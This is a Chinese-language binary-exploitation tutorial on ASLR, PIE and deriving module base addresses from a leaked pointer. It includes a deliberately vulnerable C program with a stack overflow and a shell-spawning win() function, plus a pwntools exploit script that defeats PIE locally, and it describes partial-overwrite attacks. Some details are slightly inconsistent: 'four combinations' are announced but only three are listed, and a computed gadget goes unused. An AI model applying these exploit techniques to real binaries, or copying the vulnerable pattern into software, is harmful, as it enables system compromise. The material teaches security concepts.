# 第 37 天：ASLR、PIE 与地址泄露——从随机地址到模块基址

---

## 【📌 一句话核心概括】
**ASLR 与 PIE 分别在内核装载与编译链接层对进程栈、堆、动态库及代码段基址实施随机化，防御者借此消除静态绝对指针，而攻击者则利用单处运行时地址泄露配合相对偏移不变性（`Base = Leaked_Addr - Symbol_Offset`）重新推演并定位目标模块的完整内存布局。**

## 【📖 通俗原理解释】
- **ASLR（内核级）与 PIE（编译级）的双重防御体系**：ASLR（由 Linux 内核 `randomize_va_space` 控制）随机化栈、堆和动态链接库（`libc.so`）的映射基址；PIE（由编译器 `-fPIE -pie` 控制）则将主程序自身（`.text` 与数据段）编译为共享对象（`ET_DYN`），允许内核在随机基址加载主程序。若未启用 PIE，即使 ASLR 全开，主程序代码段仍会焊死在固定虚拟基址（如 `0x400000`）。
- **相对偏移恒定定律（Offset Invariance）**：虽然模块整体装载到内存的加载偏置（Load Bias）每次运行随机变化，但 ELF 模块内部各函数与段之间的**相对距离（Offset）在编译链接后被永久固定**。
- **基址反推与任意符号重定位算法**：攻击者一旦利用格式化字符串、未初始化栈读或数组越界泄露任意一个内部函数或返回地址（`Leaked_Addr`），即可根据静态符号表反推出模块加载基址：`Module_Base = Leaked_Addr - Static_Offset`。随后，该模块内任何未导出或隐藏的目标函数（如 `win`）的真实地址均可精确算出：`Target_Addr = Module_Base + Target_Static_Offset`。
- **4KB 页对齐与末 12 位不变性**：由于操作系统以 4KB 页面（$2^{12}$ 字节）为单位分配和随机化虚拟内存，基址随机化仅能打乱高位地址，地址最低 12 位（低 3 位十六进制数字，即页内偏移）在任何运行环境下绝对恒定。此特性可用于无需完整泄露基址的低字节部分覆写（Partial Overwrite）攻击。

---

## 【🎯 为什么需要它与设计动机】

1. **防御者的终极反击：摧毁攻击者的“确定性空间”**
   在 Day 35 的 `ret2win` 中，攻击能够得手的前提是程序的代码段地址固定在 `0x401136`。操作系统的设计者意识到：只要将代码、栈、堆、动态共享库在虚拟内存中的加载基址全部随机化，攻击者硬编码的指针就会命中无效内存触发崩溃。
2. **内核级与编译器级的配合（ASLR vs PIE）**
   - **ASLR（地址空间布局随机化）**：内核的功能，负责每次运行随机分配栈、堆、共享库的映射基址。
   - **PIE（位置无关可执行文件）**：编译器的功能。如果不加 `-pie`，主程序的代码段依然会被钉死在 `0x400000`，ASLR 就会形同虚设！
3. **现代漏洞利用的核心前置任务：信息泄露（Infoleak）**
   在现代二进制安全防御体系下，“单发直接拿 Root” 的时代已经结束。现代全链条攻击的第一步，几乎百分之百是**先寻找一处微小的内存泄露，计算出目标模块的加载基址，再开展后续的代码复用（ROP）或控制流劫持**。

---

## 【🔬 核心概念深度剖析】

### 1. ASLR 与 PIE 的本质区别与协同工作

| 防护维度 | 英文全称 | 所属层次 | 保护对象 | 常见状态检查方式 |
| :--- | :--- | :--- | :--- | :--- |
| **ASLR** | Address Space Layout Randomization | **Linux 内核** | 堆（Heap）、栈（Stack）、`mmap` 区域、共享库（`libc.so`） | `cat /proc/sys/kernel/randomize_va_space`（0=关闭, 1=半开, 2=全开） |
| **PIE** | Position-Independent Executable | **编译器/链接器** | **主程序自身的可执行代码段（.text）与数据段** | `checksec --file=target` 或 `readelf -h target \| grep Type`（`DYN` 为开启，`EXEC` 为未开启） |

#### 四种组合下的真实内存表现：
```text
【情况 A: 无 ASLR + 无 PIE】
    主程序固定在 0x400000；libc 固定在 0x7ffff7...；栈和堆地址恒定不变。（最脆弱）
【情况 B: 有 ASLR + 无 PIE】
    libc、栈、堆每次运行都在变；但主程序 .text 依然死死钉在 0x400000！（攻击者可直接复用主程序代码）
【情况 C: 有 ASLR + 有 PIE】
    全内存空间大洗牌！主程序基址、libc 基址、栈基址各自独立随机化。（现代工业标准）
```

---

### 2. 模块基址计算的两大黄金公式

在 ELF 体系中，一个独立的共享对象或 PIE 二进制映像被称为一个**模块（Module）**。

#### 模块基址推导公式：
$$\text{Module Load Bias（模块加载基址）} = \text{Runtime Leaked Address（泄露的运行时地址）} - \text{Symbol Offset（符号链接时虚拟地址 } st\_value \text{）}$$

#### 目标函数真实地址计算公式：
$$\text{Target Runtime Address} = \text{Module Load Bias} + \text{Target Symbol Offset}$$

> [!CAUTION]
> **绝对禁忌：跨模块计算！**
> 主程序（PIE）的加载基址和 C 运行时库（`libc.so.6`）的加载基址是两个**相互独立、互不干扰的随机数**！你绝不能用泄露的主程序函数地址减去主程序偏移后，再加上 libc 的 `system()` 偏移！

---

### 3. 三种“偏移”的严谨辨析

初学者最容易混淆 ELF 中的各种偏移概念：

| 偏移名称 | 对应结构体字段 | 含义说明 | 能否直接代入公式 |
| :--- | :--- | :--- | :--- |
| **符号虚拟地址（RVA）** | `Elf64_Sym.st_value` | 编译器/链接器为函数或变量分配的内部相对坐标（如 `0x11a9`）。 | **可以！这正是公式所需的 offset！** |
| **文件偏移** | `Elf64_Phdr.p_offset` | 该符号或段在磁盘 ELF 二进制文件中的物理字节排布位置。 | **严禁直接相减！** 内存对齐填充会导致其不等于内存虚拟偏移。 |
| **段虚拟地址** | `Elf64_Phdr.p_vaddr` | `PT_LOAD` 段期望映射的基准虚拟地址。 | 用于校准模块在极罕见非零基地址链接时的 load bias。 |

---

### 4. 4KB 页面边界与部分覆盖（Partial Overwrite）

在 64 位 Linux 体系中，内存分页大小默认为 **4096 字节（0x1000，即 4KB）**。
这意味着：
- 虚拟地址的最低 12 个二进制位（即十六进制的**末尾 3 个字符**）在内存对齐映射时是**绝对不参与随机化的**！
- 例如，若 `win()` 函数在 ELF 中的内部相对地址是 `0x11a0`：
  - 无论系统如何随机化，运行时 `win()` 的地址末尾三位永远是 `...1a0`！
- **部分覆盖攻击（Partial Overwrite）**：
  如果攻击者只需要跳转到同一模块内的其他函数，只需覆盖栈上原返回地址的**最后 1 个或 2 个字节**：
  - 覆盖最后 1 个字节：精准修改末 2 位十六进制，100% 稳定，无需任何地址泄露！
  - 覆盖最后 2 个字节：由于涉及第 4 位十六进制（位于随机化的页面基址内），只需爆破 4 位（$2^4 = 16$ 种可能），成功概率高达 1/16！

---

## 【🛠️ 工业实操与反汇编/调试验证】

### 1. 易受攻击的源码（`pie_leak_demo.c`）

本程序展示了利用未初始化或未截断的字符串泄露函数地址，并完成基址反推。

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void win(void) {
    puts("[+] BINGO! You bypassed ASLR & PIE successfully!");
    system("/bin/sh");
}

void reveal_secret(void) {
    // 故意泄露一个函数指针，模拟实际场景中的未初始化栈内存泄露
    void *ptr = (void *)reveal_secret;
    printf("[*] Leaked function address: %p\n", ptr);
}

void vulnerable(void) {
    char buf[32];
    reveal_secret();
    puts("Input your payload:");
    read(0, buf, 128); // 栈缓冲区溢出
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    vulnerable();
    return 0;
}
```

### 2. 编译并验证全开防护状态

```bash
# 启用 PIE，禁用 Canary，保留 NX
gcc -O0 -fno-stack-protector -fPIE -pie pie_leak_demo.c -o pie_leak_demo
```

### 3. 用 `readelf` 提取符号的链接时虚拟地址（Offsets）

```bash
readelf -s pie_leak_demo | grep -E "win|reveal_secret"
```
终端输出示例：
```text
    48: 0000000000001169    37 FUNC    GLOBAL DEFAULT   14 win
    49: 000000000000118e    47 FUNC    GLOBAL DEFAULT   14 reveal_secret
```
- `win` 的相对虚拟偏移为 `0x1169`。
- `reveal_secret` 的相对虚拟偏移为 `0x118e`。
- **两者的固定相对距离差**：`0x1169 - 0x118e = -0x25`（即 `win` 在 `reveal_secret` 前面 37 字节）。

### 4. 编写并运行自动化 Exploit（`solve.py`）

```python
from pwn import *

elf = ELF('./pie_leak_demo')
p = process('./pie_leak_demo')

# 1. 接收并解析泄露的地址
p.recvuntil(b"Leaked function address: ")
leaked_addr_str = p.recvline().strip()
leaked_reveal_addr = int(leaked_addr_str, 16)
log.info(f"Leaked reveal_secret address: {hex(leaked_reveal_addr)}")

# 2. 计算模块加载基址 (Load Bias)
elf.address = leaked_reveal_addr - elf.symbols['reveal_secret']
log.success(f"Calculated PIE Base: {hex(elf.address)}")

# 3. 动态求出 win() 的运行时绝对地址
win_addr = elf.symbols['win']
log.success(f"Calculated win() runtime address: {hex(win_addr)}")

# 4. 构造 Payload (56 字节填充 + win 地址)
# 注意: 同样可以加入一个单纯 ret 保持 16 字节对齐
ret_gadget = elf.address + 0x101a # 假设从当前模块找一个 ret

payload = b"A" * 56 + p64(win_addr + 1) # 或者 win+1 跳过 push rbp

p.sendlineafter(b"Input your payload:\n", payload)
p.interactive()
```

运行结果：即使每次进程启动时基址彻底随机，计算得出的 `PIE Base` 和 `win()` 依然百发百中！

---

## 【⚠️ 常见陷阱与避坑指南】

| 陷阱与盲区 | 深度机理与表象 | 正确解法与工程底线 |
| :--- | :--- | :--- |
| **混淆文件偏移与虚拟地址** | 从 `readelf -S` 中把 `File Off` 当成公式里的偏移减去，导致算出的基址低位错位。 | 始终以 `readelf -s` 中的符号 `Value`（`st_value`）作为计算基准。 |
| **试图跨模块推算地址** | 泄露了 libc 的 `printf` 地址，却用它去减主程序的 `main` 偏移。程序立即崩溃抛出非法内存访问。 | 明确区分内存中的每一个 `.so` 和可执行主程序，**各自维护一套独立的 Base 计算体系**。 |
| **忽略 4KB 页面对齐特征** | 算出的模块基址（Base）末尾三个十六进制数字不为 `000`（如 `0x555555554120`）。这在逻辑上是绝对错误的！ | 虚拟内存映射以页为最小单位，**所有 ELF 模块的基址末尾 12 位（3 个十六进制字符）必须为 000**。如果不是，必定是减错了偏移！ |
| **ASLR 环境下的 GDB 调试假象** | 在 GDB 内部每次 `run` 看到的地址都是一模一样的，误以为 ASLR 没有生效。 | GDB 默认会为调试方便执行 `set disable-randomization on`。若需测试真实随机化，必须在 GDB 中显式执行 `set disable-randomization off`。 |

---

## 【💼 经典面试与工程实操自测】

### Q1：为什么未开启 PIE 的程序，即便 Linux 系统全局开启了最高的 ASLR（值为 2），其安全性依然脆弱？
> **参考答案**：
> - Linux 内核的 ASLR 负责将栈、堆、动态共享库（`libc.so`）随机映射。但是，如果主程序编译时未指定 `-fPIE -pie`，链接器会生成传统的 `ET_EXEC` 类型二进制，其代码段（`.text`）和全局数据段的加载地址是**硬编码写死在程序头表中的（通常为 `0x400000`）**。
> - 尽管 libc 和栈地址随机化了，但主程序内部的所有汇编指令、ROP Gadget、固定函数和全局变量的地址依然是静态固定的。攻击者可以直接在固定代码段中寻找跳转指令或利用现有逻辑构造攻击链，使 ASLR 的防护效果大打折扣。

### Q2：在 64 位 Linux 系统中，为什么内存地址的最低 12 位（3 个十六进制位）不会被 ASLR 随机化？这个特性能带来什么攻击思路？
> **参考答案**：
> - Linux 虚拟内存系统采用以 **4KB（$2^{12} = 4096$ 字节）** 为基本粒度的分页机制。操作系统在将 ELF 映射到虚拟地址空间时，必须以完整的内存页（Page-aligned）为起点。因此，随机化仅改变高位页面号，而页内偏移（低 12 位）保持完全不变。
> - **攻击利用**：
>   1. **部分覆盖（Partial Overwrite）**：若只需跳转到相邻函数，攻击者只需修改返回地址的最低 1 字节（8 位）或 2 字节（16 位），无需完整泄露基址即可高概率或确定性劫持控制流；
>   2. **快速完整性检验**：算出的基址低 12 位若非 `000`，可直接判定偏移计算错误。

### Q3：如何严谨地在 GDB 中验证你计算出来的模块基址是 100% 正确的？
> **参考答案**：
> 1. 在 GDB 中运行程序后，执行 `info proc mappings`（或 GEF/pwndbg 下的 `vmmap`）；
> 2. 查看目标模块（如 `./pie_leak_demo` 或 `/lib/x86_64-linux-gnu/libc.so.6`）的第一行映射记录；
> 3. 该记录对应的起始虚拟内存地址（`Start Addr`）即为系统内核赋予该模块的真实基址；
> 4. 将手工推导的 `Base = Leak - Offset` 与该起始地址逐字节比对，二者必须完全一致且低 12 位为 `000`。
